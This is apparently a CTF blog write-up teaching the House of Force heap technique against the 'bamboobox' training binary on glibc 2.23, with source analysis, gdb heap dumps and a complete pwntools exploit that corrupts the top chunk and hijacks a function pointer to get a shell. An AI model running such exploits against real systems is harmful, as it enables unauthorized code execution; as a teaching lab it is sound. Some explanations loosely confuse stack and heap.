---
title: "House of Force"
toc_sticky: true
toc_title: ""
categories:
  - ctf
tags:
  - unix
  - pwn
---

This is going to be a multi part series demonstrating and explaining each house exploitation technique
as best i can. I will also be including several binaries which demonstrate these techniques, so we
can get experience in practically using them within ctfs.

Okay, what is the House of Force? This is an exploitation technique that involved exploiting a loophole
within the wilderness to trick malloc into allocating chunks outside the bounds of the heap. The most
recent technique is only applicable to glibc < 2.29, which means this challenge will not work on your
system. You can check your glibc version by using ldd to find the path to libc, then just simply running
it. My current libc version is 2.33 so i will be needing a virtual machine for this challenge. I
reccomend using vagrant, though docker would work just fine.

The exploit will be using glibc 2.23, so if there is any issues with the exploit on your docker image
or virtual machine then it might be that. Ubuntu Xenial 16.04 is the version I am running.

Some conditions that are required in order to perform the "House of Force", is an unrestricted heap
overflow that will be able to reach and overwrite the METADATA of the top chunk, also known as the
wilderness. We must also have the ability to dicate how large our allocation size will be, when
passing it to malloc.

The reason we need this, is if we can overwrite the wilderness, with say 0xffffffff. Malloc will think
that the space on the heap is MASSIVE and will no longer ask the operating system for extra memory. This
means that we will be able to allocate chunks OUTSIDE of the heap, with malloc still thinking that
we are within the bounds since the only way it knows the chunk size, is from the wilderness.

lets visualize this:

```
           AAAAAAAAAAAA  0x20300
[metadata][usable_chunk][metadata][      top_chunk       ][end of heap]
```

okay, as we can see, we have allocated 1 chunk on the heap. The top chunk is the space left on the
stack, and the "metadata" of the top chunk, the wilderness will hold the size of the top chunk. Or the
space left on the heap, before malloc must request more memory from the operating system to grow the
stack, or mmap our allocation directly.

now lets perform a heap overflow, and see what what happens when we overwrite the wilderness

```
          AAAAAAAAAAAAAAAffffffff
[metadata][usable_chunk][metadata][      top_chunk       ][end of heap]
```

okay, so the wilderness is now the largest value that we can represent within 4 bytes. Lets allocate
a new chunk, and see what we can do with it:

```
          AAAAAAAAAAAAAAAffffffff
[metadata][usable_chunk][metadata][      top_chunk       ][end of heap]
                        [metadata][AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
```

now as we can see, malloc will NOT request memory to grow the heap, as it doesnt look like it needs to!
it will only check for the size of the top chunk, but since we overwrote that wilderness value, we are
allowed to allocate chunks outside of the heap.

this may provide us with interesting exploitation scenarios and techniques

## HITCON Training - Bamboobox

This binary has 2 methods of exploitation, each only valid for older versions of glibc. I will be using
Ubuntu Xenial 16.04, which uses glibc 2.23. This version of glibc has practically no protections
or heap hardening, so we should be able to get away with an archaic tecniques from Phantasmal
Phantasmagoria's phrack article.

One of these techniques is called house of force, in which i will attempt to get into later. The
vulnerability within the binary is a heap overflow, which leads to us being allowed to edit free
chunks. Since we are allowed to edit the metadata on the heap, this can lead to many many exploitable
scenarios.

We can leverage this heap overflow to craft an unlink exploit as well. In the recent glibc versions, this
exploit has been mitigated with "safe linking". It eliminates a 20 year old bug within the heap, and
will secure the fd and bk pointer from giving us an arbitrary write what where whenever we use the
unlink macro.

However, there has been ANOTHER complex technique that bypasses this safe linking mitigation, called
House of Rust. I will not be demonstrating that within the unlink exploitation part of this challenge,
as it deserves it's own post. Anyways, lets get on with the exploitation of the binary.

we will first start off with reversing the binary, we are given the source of the binary but it is
still important to look at the disassembly. The real code is the binary, not the source, there may
be optimizations or weird implementations that the compiler has generated, that the high level c
code will not show. It is important to understand the details, so lets analyze both the source and the
disassembly.

```c
struct item{
	int size;
	char *name;
};

struct box{
	void (*hello_message)();
	void (*goodbye_message)();
};

struct item itemlist[100] = {0};
int num;
```

here we can see the global variables, we have a item structure that will be used as a global object to
represent an item. This item will be stored in the itemlist, which contains a static amount of 100 entries.
This item struct's size will be 12 bytes. This does not exactly matter as each of these structures will
be under 24 bytes which is the minimum usable chunk returned to by ptmalloc2. The reason for this is due
to the fact that a 32 bit integer is 4 bytes, and char* name is a char pointer, which will hold an
address to the string within memory instead of containing the char array inside the object.

Next, we have a box structure, which will contain function pointers that will most likely be executed. We
see this a lot within challenges, as this gives us a way to gain code execution if we get an arbitrary
write over this object in the heap. This is a function pointer, so it will be 16 bytes in size, as this
is a 64 bit binary.

There is a global num integer, this will be stored as 4 bytes .bss as it is a global 32 bit signed integer
to represents the amount of entries within itemlist.

Lets continue to the main function.

```c
int main(){
	char choicebuf[8];
	int choice;
	struct box *bamboo ;
	setvbuf(stdout,0,2,0);
	setvbuf(stdin,0,2,0);
	bamboo = malloc(sizeof(struct box));
	bamboo->hello_message = hello_message;
	bamboo->goodbye_message = goodbye_message ;
	bamboo->hello_message();
```

okay, so it will allocate a char buffer of 8 chars, which will store our integer input. It will then
allocate an integer called choice, and allocate an object from the box structure called bamboo. It will
then disable output and input buffering, then allocate a box structure on the heap. This is a pretty dumb
way to do this, this would be much better:

```c
struct box* bamboo=(struct box*)malloc(sizeof(box));
```

this code defines a clear purpose, and will not be split up between other code. Anyways, after the allocation
it will point the hello_message function pointer to hello_message(), and goodbye_message to goodbye_message().

it will then CALL hello_message() from that bamboo object. There is only 1 bamboo object here, and its only
purpose is to store and call the hello and goodbyte function pointers.

```c
	while(1){
		menu();
		read(0,choicebuf,8);
		choice = atoi(choicebuf);
		switch(choice){
			case 1:
				show_item();
				break;
			case 2:
				add_item();
				break;
			case 3:
				change_item();
				break;
			case 4:
				remove_item();
				break;
			case 5:
				bamboo->goodbye_message();
				exit(0);
				break;
			default:
				puts("invaild choice!!!");
				break;
		}
	}
	return 0 ;
}
```

okay, this is just a simple menu. Something that should be noted is that, WE are allowed to control when
bamboo->goodbye_message() will be called. That means that if we can overwrite that function pointer, we can
gain code execution.

```c
void hello_message(){
	puts("There is a box with magic");
	puts("what do you want to do in the box");
}
void goodbye_message(){
	puts("See you next time");
	puts("Thanks you");
}
```

okay, so this is the hello and goodbye message that the bamboobox will contain function pointers to.

```c
void menu(){
	puts("----------------------------");
	puts("Bamboobox Menu");
	puts("----------------------------");
	puts("1.show the items in the box");
	puts("2.add a new item");
	puts("3.change the item in the box");
	puts("4.remove the item in the box");
	puts("5.exit");
	puts("----------------------------");
	printf("Your choice:");
}
```

menu function, nothing else to say.

```c
void show_item(){
	int i ;
	if(!num){
		puts("No item in the box");
	}else{
		for(i = 0 ; i < 100; i++){
			if(itemlist[i].name){
				printf("%d : %s",i,itemlist[i].name);
			}
		}
		puts("");
	}
}
```
it will allocate an "i" integer on the stak, and use it as a counter in the for loop.
if the global num is still undefined/uninitialized, it will tell us that there are no
items inside of the box.

else, it will iterate through itemlist, and print the index and name within each object.

This is also an extremely stupid idea, as you do not need to iterate through each and
every entry within the itemlist, you only need to iterate UNTIL you reach num. Im sure
that the creators of the binary did this on purpose, as the num global integer has
not been defined. If there was a reason behind leaving it undefined, then it may
come in handy later.

```c
int add_item(){

	char sizebuf[8] ;
	int length ;
	int i ;
	int size ;
	if(num < 100){
		printf("Please enter the length of item name:");
		read(0,sizebuf,8);
		length = atoi(sizebuf);
		if(length == 0){
			puts("invaild length");
			return 0;
		}
		for(i = 0 ; i < 100 ; i++){
			if(!itemlist[i].name){
				itemlist[i].size = length ;
				itemlist[i].name = (char*)malloc(length);
				printf("Please enter the name of item:");
				size = read(0,itemlist[i].name,length);
				itemlist[i].name[size] = '\x00';
				num++;
				break;
			}
		}
	}else{
		puts("the box is full");
	}
	return 0;
}
```

next, we have our add item function. This will do exactly as the name suggests, it will
add an item. First, it initializes a few variables, an 8 byte char array, and 3
uninitialized integers called length, i, and size.

the global num integer has not been initialized, yet it is being incremented. This is not
an inherint security vulnerability, though it may lead to undefined behaviour. The compiler
might detect and initialize for us, but we dont know that. That is why we need to read the
disassembly.

```c
void change_item(){

	char indexbuf[8] ;
	char lengthbuf[8];
	int length ;
	int index ;
	int readsize ;

	if(!num){
		puts("No item in the box");
	}else{
		printf("Please enter the index of item:");
		read(0,indexbuf,8);
		index = atoi(indexbuf);
		if(itemlist[index].name){
			printf("Please enter the length of item name:");
			read(0,lengthbuf,8);
			length = atoi(lengthbuf);
			printf("Please enter the new name of the item:");
			readsize = read(0,itemlist[index].name,length);
			*(itemlist[index].name + readsize) = '\x00';
		}else{
			puts("invaild index");
		}
	}
}
```

our next function is the change item. It will allow us to change the size and contents of our
item object. Lets see how they implement that and check for any surface level vulnerabilities
within the code.

it will read in 8 bytes, each representing an integer that will be converted with atoi. I
believe that this is used as opposed to scanf due to scanf not having any bounds checking. We
could easily overflow this integer if we had used scanf, and introduce more undefined behaviour.

If num has not been initialized, or if there isnt any value within num, it will tell us that
there are no items within the box. else, it will ask us for the index of the item object to
edit/change.

if that index HAS a name char pointer, it will prompt us with the edit menu. else it will exit and
tell us that there is an invalid index.

else, if that index exists, it will ask us fro the length of our item name. It will read in the
length, and store it inside the local "length" integer. Next, this part seems pretty complicated
since c syntax is pretty strange, but if you understand assembler it should be too hard.

It will ask us for the new name of the item, when we enter it will allow us to read in the length
we provided into our name member within the item object. Now, this next function's purpose is to
remove the trailing '\n' that read() will read in. it will dereference the address of the char pointer
to access the real value of the char, instead of the pointer, and add/increment it by the amount of
bytes read in. It will then change that last char into a null terminating byte.

the read() system call or c library wrapper, will return the amount of bytes that read had read into
the buffer.

in assembler psuedo code, it would look something like this:

```nasm
mov rdi, [rbp-0x8]			   ; index value, i just made a random offset for index.
mov rax, [obj.itemlist+rdi*12] ; obj.itemlist used as base pointer + index*sizeof(item) ; dereference
mov rcx, [rbp-0x12]			   ; readsize offset, again this is just my best guess
add rax, rcx				   ; increment through char array until last char reached, '\n'
mov rax, 0					   ; change \n into \x00
```

this is just pseudocode on how that snippet of c code should work. Lets move onto the next function.

```c
void remove_item(){
	char indexbuf[8] ;
	int index ;

	if(!num){
		puts("No item in the box");
	}else{
		printf("Please enter the index of item:");
		read(0,indexbuf,8);
		index = atoi(indexbuf);
		if(itemlist[index].name){
			free(itemlist[index].name);
			itemlist[index].name = 0 ;
			itemlist[index].size = 0 ;
			puts("remove successful!!");
			num-- ;
		}else{
			puts("invaild index");
		}
	}
}
```

it will free the name member of the object. It will then null out the name and size pointers of the freed
object to prevent a uaf bug. it will then decrement the global num counter, as we have just delted one entry.

I am not sure how this works from a first glance, but why would they object.name only? does that mean the size
value still exists on the heap? we will have to make sure later in gdb.

```c
void magic(){
	int fd ;
	char buffer[100];
	fd = open("/home/bamboobox/flag",O_RDONLY);
	read(fd,buffer,sizeof(buffer));
	close(fd);
	printf("%s",buffer);
	exit(0);
}
```

okay, we have our "magic" function in which we will leverage to get our flag. This is probably the function
we will use to overwrite the goodbye_message() function pointer on the heap with. I have recompiled this
to just directly give us a shell. We may also later just completely get rid of this easy function
and resort to leaking addresses of libc and overwriting something like _\_malloc_hook.

okay, lets play around with the binary now. We know that in order to perform our house of force
technique, we would prefereably need a heap overflow. Any vulnerability that would allow us
access over the top chunk(wilderness) size metadata will work out fine, but heap overflows are
prefered.

Lets play with the binary and see if we can replicate one.

```
There is a box with magic
what do you want to do in the box
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:2
Please enter the length of item name:16
Please enter the name of item:AAAAAAAAAAAAAAAA
```

```
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:1
0 : AAAAAAAAAAAAAAAA
```

```
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:3
Please enter the index of item:0
Please enter the length of item name:20
Please enter the new name of the item:BBBBBBBBBBBBBBBBBBBB
```

```
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:1
0 : BBBBBBBBBBBBBBBBBBBB
----------------------------
```

yes, so as we can see, we have a heap overflow on the change/edit item
within the box. This will allow us to write more bytes than the buffer on the
heap can contain, which will enable us to edit chunk metadata.

There are several variants of the house of force techniques, and many applications
that may be leveraged within the general concept of house of force. The main application
in which we can leverage this heap overflow, is by overwriting the top chunk's wilderness
metadata value into something massive. We can overwrite the wilderness with the largest value
an unsigned integer can represent, "-1".

```nasm
gef➤  heap chunks
Chunk(addr=0x555556269010, size=0x250, flags=PREV_INUSE)
    [0x0000555556269010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555556269260, size=0x20, flags=PREV_INUSE)
    [0x0000555556269260     46 08 40 00 00 00 00 00 61 08 40 00 00 00 00 00    F.@.....a.@.....]
Chunk(addr=0x555556269280, size=0x40, flags=PREV_INUSE)
    [0x0000555556269280     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA]
Chunk(addr=0x5555562692c0, size=0xfffffffffffffff8, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  top chunk
gef➤  
```

```nasm
0x5555562691b0: 0x0000000000000000      0x0000000000000000
0x5555562691c0: 0x0000000000000000      0x0000000000000000
0x5555562691d0: 0x0000000000000000      0x0000000000000000
0x5555562691e0: 0x0000000000000000      0x0000000000000000
0x5555562691f0: 0x0000000000000000      0x0000000000000000
0x555556269200: 0x0000000000000000      0x0000000000000000
0x555556269210: 0x0000000000000000      0x0000000000000000
0x555556269220: 0x0000000000000000      0x0000000000000000
0x555556269230: 0x0000000000000000      0x0000000000000000
0x555556269240: 0x0000000000000000      0x0000000000000000
0x555556269250: 0x0000000000000000      0x0000000000000021
0x555556269260: 0x0000000000400846      0x0000000000400861
0x555556269270: 0x0000000000000000      0x0000000000000041
0x555556269280: 0x4141414141414141      0x4141414141414141
0x555556269290: 0x4141414141414141      0x4141414141414141
0x5555562692a0: 0x4141414141414141      0x4141414141414141
0x5555562692b0: 0x4141414141414141      0xffffffffffffffff
0x5555562692c0: 0x0000000000000000      0x0000000000000000
0x5555562692d0: 0x0000000000000000      0x0000000000000000
0x5555562692e0: 0x0000000000000000      0x0000000000000000
0x5555562692f0: 0x0000000000000000      0x0000000000000000
0x555556269300: 0x0000000000000000      0x0000000000000000
0x555556269310: 0x0000000000000000      0x0000000000000000
0x555556269320: 0x0000000000000000      0x0000000000000000
gef➤  
```

We can overwrite the wilderness value with 0xffffffffffffffff, which is 8 bytes of 0xff, which
will represent our -1 value. If you are viewing the chunk within gdb-gef, you may notice some
strange things with top chunk size. For example, it may say 0xffffffffffffffff8, instead of
0xffffffffffffffff. This is due to the bit flags that have been set, if you were to manually
check the value of the wilderness, you would find that it was still 0xffffffffffffffff.

Okay, now lets get onto the real overwriting part. How can we overwrite the wilderness?

we can either guess and check repeatedly through gdb, or we can just calculate it by using
offsets within the addresses. The formula goes like this:

address_of_wilderness - address_of_chunk0_start

its pretty simple, but this is how you would go about calculating the offset to the wilderness.

once we have overwritten the wilderness, what can we do next?

it seems like we have free reign to allocation chunks outside of the heap correct??
well, we dont exactly want to, lets view the heap and see what we can work with.

```text
requestSize = (size_t)victim            // The target address/chunk that malloc should return
                - (size_t)top_chunk     // The present address of the top chunk/addr of wilderness
                - 2*sizeof(long long)   // Size of 'size' and 'prev_size' / sizeof(long long)*2 = 16;
                - sizeof(long long);    // Additional buffer / sizeof(long long) = 8;
```

as we can see, the general formula to follow is this. The addresses you provide dont need to be
specifically accurate for the majority of the time. It will pad out and allocate with 16 bytes.

here is the exploit, tested for ubuntu xenial 16.04

```py
#!/usr/bin/env python3
# glibc 2.23 & 2.27
from pwn import process,ELF,context,remote,pause
from fastpwn import pack,log
from sys import argv
context(arch='amd64',os='linux')
binary=ELF("./bamboobox",checksec=False)
libc=ELF("./libc.so.6",checksec=False)
if len(argv)>1 and argv[1]=="-r":
    p=remote("ubuntu.box",9999) #glibc 2.33 vm
else:
    p=process(["./ld-2.27.so","./bamboobox"],env={'LD_PRELOAD':'./libc.so.6'})
## helper func, only for sending ascii, no raw bytes
s=lambda x,r=":":p.sendlineafter(str(r),str(x)) if r else p.sendline(str(x))
def show_item():
    s(1,"choice:")
def add_item(sz,n):
    s(2,"choice:")
    s(sz)
    s(n)
def edit_item(ind,nl,nn):
    s(3,"choice:")
    s(ind)
    s(nl)
    p.sendlineafter(":",nn)
def remove_item(ind):
    s(4,"choice:")
    s(ind)
magic=binary.symbols['magic']

add_item(48,"A"*48) # usable chunk size: 56 ; real size: 64/65

edit_item(0,64,b"A"*56+b"\xff\xff\xff\xff\xff\xff\xff\xff") # overwrite wilderness
log.log("overwrite wilderness")
pause()
#offset to wilderness & overwrite w/ -1
#add_item("-112","AAAAAAAA")
add_item("-112","AAAAAAAA") # will overwrite welcome_message func ptr with AAAAAAAA
# malloc will return usable chunk size of 4294971376 between -104 and -118
# general formula around calculating the "approximate" chunk size to pass to malloc after h.o.f
#
# requestSize = (size_t)victim            // The target address/chunk that malloc should return
#                 - (size_t)top_chunk     // The present address of the top chunk/addr of wilderness
#                 - 2*sizeof(long long)   // Size of 'size' and 'prev_size' / sizeof(long long)*2 = 16;
#                 - sizeof(long long);    // Additional buffer / sizeof(long long) = 8;
#
# credit: https://heap-exploitation.dhavalkapil.com/attacks/house_of_force

#pause()
add_item("16","overflow_me_senpai") # alloc new chunk, overwrite func ptrs

edit_item(2,16,b"A"*8 + pack.pk64(magic)) # edit, and overwrite
# idk if we need this, but i dont wanna edit my add_item helper func and edit everything to send raw

#pause()
p.sendlineafter("choice:","5")
log.log("SHELL INCOMING!!! SHELL INCOMING!!!")
p.interactive()
```
